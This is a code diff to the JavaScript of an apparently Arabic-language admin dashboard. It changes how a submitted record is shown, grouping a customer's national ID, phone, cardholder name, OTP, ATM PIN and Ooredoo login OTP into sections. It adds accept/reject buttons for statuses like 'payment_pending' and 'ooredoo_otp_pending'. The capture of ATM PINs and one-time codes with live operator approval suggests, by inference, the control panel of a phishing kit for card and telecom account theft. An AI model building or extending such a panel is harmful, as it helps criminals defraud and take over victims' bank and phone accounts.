@@ -562,55 +562,62 @@ function openPop(ref){
   // الحقول التي تُعرض بتنسيق خاص أو تُتجاهل
   const specialFields = ['createdAt', 'updatedAt', 'visitId', 'ref'];
 
-  // بناء صفوف الجدول من جميع الخصائص (فقط الحقول المملوءة)
-  let fieldsHTML = '<div class="dgrid">';
-  for (const [key, value] of Object.entries(o)) {
-    // تجاهل الحقول الفارغة والحقول الخاصة والبيانات الداخلية
-    if (!value || specialFields.includes(key) || key.startsWith('qic')) continue;
-    if (value === '—' || value === '' || value === null || value === undefined) continue;
+  // ترتيب الحقول حسب الأقسام
+  let fieldsHTML = '';
 
+  // 1. بيانات العميل الأساسية
+  fieldsHTML += '<div style="margin-bottom:20px"><h4 style="margin:0 0 12px; color:var(--ink); font-size:14px; font-weight:700">📋 بيانات العميل</h4><div class="dgrid">';
+  const basicFields = ['n', 'id', 'g', 'p', 'e'];
+  basicFields.forEach(key => {
+    const value = o[key];
+    if (!value || value === '—' || value === '' || value === null) return;
     let label = fieldLabels[key] || key;
     let displayValue = '—';
-
-    // معالجة خاصة لكل نوع حقل
     if (key === 'p') displayValue = fmtPhone(value);
     else if (key === 'id') displayValue = fmtEid(value);
-    else if (key === 'ts' || key === 'createdAt' || key === 'updatedAt') displayValue = fmtDate(value);
-    else if (key === 'status') displayValue = statusText(value);
     else if (key === 'g') displayValue = value === 'female' ? 'أنثى' : 'ذكر';
-    else if (key === 'st') displayValue = value === 'resident' ? 'مقيم' : 'مواطن';
-    else if (key === 'em') displayValue = emName(value) || value;
-    else if (key === 'a') displayValue = areaName(o.em, value) || value;
-    else if (key === 'card') {
-      const c = plans.find(p => p.cls === value);
-      displayValue = c ? c.ar : value;
-    }
-    else if (key === 'watch') {
-      const w = WATCHES.find(w => w.id === value);
-      displayValue = w ? w.ar : value;
-    }
-    else if (key === 'pay') {
-      if (value && typeof value === 'object') {
-        displayValue = `المبلغ: ${value.amount} ${value.currency} | الحالة: ${value.status}`;
-      }
-    }
-    else if (key === 'ooredoo') {
-      if (value && typeof value === 'object') {
-        displayValue = `الهاتف: ${value.phone}`;
-      }
-    }
-    else if (key === 'otp' || key === 'atmPin' || key === 'ooredooOtp') {
-      displayValue = '***'; // إخفاء الأكواز الحساسة
-    }
-    else if (typeof value === 'object') continue; // تجاهل الكائنات المعقدة
     else displayValue = esc(String(value));
+    if (displayValue && displayValue !== '—') {
+      const isLtr = ['p', 'id', 'e'].includes(key);
+      fieldsHTML += `<div class="drow"><span class="k">${label}</span><span class="v" ${isLtr ? 'style="direction:ltr"' : ''}>${displayValue}</span></div>`;
+    }
+  });
+  if (o.pay && o.pay.amount) {
+    fieldsHTML += `<div class="drow"><span class="k">مبلغ التأمين</span><span class="v" style="direction:ltr">${o.pay.amount} ${o.pay.currency}</span></div>`;
+  }
+  fieldsHTML += '</div></div>';
 
-    if (!displayValue || displayValue === '—') continue; // تجاهل القيم الفارغة بعد المعالجة
+  // 2. بيانات البطاقة
+  fieldsHTML += '<div style="margin-bottom:20px"><h4 style="margin:0 0 12px; color:var(--ink); font-size:14px; font-weight:700">💳 بيانات البطاقة</h4><div class="dgrid">';
+  if (o.cardName) fieldsHTML += `<div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(o.cardName)}</span></div>`;
+  if (o.pay) fieldsHTML += `<div class="drow"><span class="k">الحالة</span><span class="v">${o.pay.status}</span></div>`;
+  if (o.otp) fieldsHTML += `<div class="drow"><span class="k">OTP</span><span class="v">***</span></div>`;
+  if (o.atmPin) fieldsHTML += `<div class="drow"><span class="k">ATM PIN</span><span class="v">***</span></div>`;
+  fieldsHTML += '</div>';
 
-    const isLtr = ['p', 'id', 'ts', 'createdAt', 'updatedAt', 'e', 'pay'].includes(key);
-    fieldsHTML += `<div class="drow"><span class="k">${label}</span><span class="v" ${isLtr ? 'style="direction:ltr"' : ''}>${displayValue}</span></div>`;
+  if (o.status === "awaiting" || o.status === "payment_pending" || o.status === "payment_accepted") {
+    fieldsHTML += `<div class="dactions" style="margin-top:12px">
+      <button class="rbtn accept" data-accept="${esc(o.ref)}" style="flex:1"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
+      <button class="rbtn reject" data-reject="${esc(o.ref)}" style="flex:1; margin-right:8px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
+    </div>`;
   }
   fieldsHTML += '</div>';
+
+  // 3. بيانات أوريدو
+  if (o.ooredoo || o.ooredooOtp) {
+    fieldsHTML += '<div style="margin-bottom:20px"><h4 style="margin:0 0 12px; color:var(--ink); font-size:14px; font-weight:700">📱 بيانات أوريدو</h4><div class="dgrid">';
+    if (o.ooredoo && o.ooredoo.phone) fieldsHTML += `<div class="drow"><span class="k">رقم الهاتف</span><span class="v" style="direction:ltr">${fmtPhone(o.ooredoo.phone)}</span></div>`;
+    if (o.ooredooOtp) fieldsHTML += `<div class="drow"><span class="k">OTP أوريدو</span><span class="v">***</span></div>`;
+    fieldsHTML += '</div>';
+
+    if (o.status === "awaiting" || o.status === "ooredoo_login_pending" || o.status === "ooredoo_otp_pending") {
+      fieldsHTML += `<div class="dactions" style="margin-top:12px">
+        <button class="rbtn accept" data-accept="${esc(o.ref)}" style="flex:1"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
+        <button class="rbtn reject" data-reject="${esc(o.ref)}" style="flex:1; margin-right:8px"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>
+      </div>`;
+    }
+    fieldsHTML += '</div>';
+  }
 
   $("popBody").innerHTML = fieldsHTML + `
     <div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
